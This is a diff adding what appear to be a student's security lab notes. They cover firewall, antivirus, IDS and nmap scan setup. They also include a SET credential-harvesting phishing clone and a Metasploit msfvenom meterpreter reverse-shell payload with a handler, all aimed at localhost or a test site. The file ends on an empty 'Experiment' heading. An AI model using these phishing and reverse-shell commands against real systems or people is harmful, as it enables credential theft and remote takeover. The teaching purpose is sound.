@@ -1,0 +1,70 @@
+Exp 1: Setting up and configuring a firewall
+
+sudo apt update
+sudo apt install ufw
+sudo ufw enable
+sudo ufw status verbose
+sudo ufw default deny incoming
+sudo ufw default allow outgoing
+sudo ufw allow ssh
+sudo ufw allow http
+sudo ufw allow https
+sudo ufw allow 80/tcp
+sudo ufw allow 8080
+sudo ufw deny 23/tcp
+sudo ufw status verbose
+sudo ufw status numbered
+sudo ufw disable
+
+Exp 2: Implementing and Testing Antivirus Software
+
+sudo apt update
+sudo apt install clamav clamav-daemon
+sudo systemctl stop clamav-freshclam  
+sudo freshclam 
+sudo systemctl start clamav-freshclam
+sudo clamscan -r / --bell -i
+sudo curl -O https://secure.eicar.org/eicar.com.txt
+clamscan eicar.com.txt
+or
+sudo apt update
+sudo apt install clamav clamav-daemon
+curl -O https://secure.eicar.org/eicar.com.txt
+clamscan --infected --recursive --bell /home/kali
+(For windows do a quick scan in windows security - virus and threat protection)
+
+Experiment 3: Simulating a Phishing attack and detection
+ifconfig
+(note down your ip address)
+sudo setoolkit
+press 1->enter->2->enter->3->enter->2->enter->
+Enter your local IP address (e.g., 10.0.2.15)
+Enter the new website URL to clone (http://testphp.vulnweb.com/login.php)
+open ur browser
+Visit: http://<your-IP> (e.g., http://10.0.2.15)
+Enter dummy credentials.
+Watch them appear in the terminal.
+
+Experiment 5: install and configure ids
+ip link show
+sudo apt update
+sudo apt install -y suricata
+sudo suricata-update
+sudo suricata -c /etc/suricata/suricata.yaml -i <IP(lo)>
+sudo apt install -y nmap
+sudo nmap -sS -Pn 127.0.0.1
+
+Experiment 6:Exploiting a sample vulnerability using Metasploit
+sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o /tmp/shell.elf
+sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; set LPORT 4444; set ExitOnSession false; exploit -j"
+the below 2 lines in another terminal:
+chmod +x /tmp/shell.elf
+/tmp/shell.elf &
+sessions -l
+sessions -i 1
+sysinfo
+getuid
+
+Experiment
+
+
